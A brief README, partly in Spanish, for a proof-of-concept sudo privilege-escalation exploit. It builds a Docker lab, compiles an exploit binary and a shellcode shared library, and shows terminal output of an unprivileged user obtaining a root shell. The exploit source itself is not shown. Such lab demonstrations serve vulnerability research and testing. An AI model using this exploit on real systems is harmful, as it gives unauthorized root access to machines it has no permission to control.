# POC Sudo vulnerable

## Pasos

1. Build.
```bash 
docker build -t sudo_env .
```

2. Run.
```bash
docker run -it sudo_env
```

3. Exploit.
```bash
newuser@8c37d5a4c97f:~$ ls -l
total 4
drwxr-xr-x 1 newuser newuser 4096 May 18 00:57 exploit
newuser@8c37d5a4c97f:~/exploit$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
newuser@8c37d5a4c97f:~/exploit$ whoami
newuser
newuser@8c37d5a4c97f:~/exploit$ ./exploit
# whoami
root
```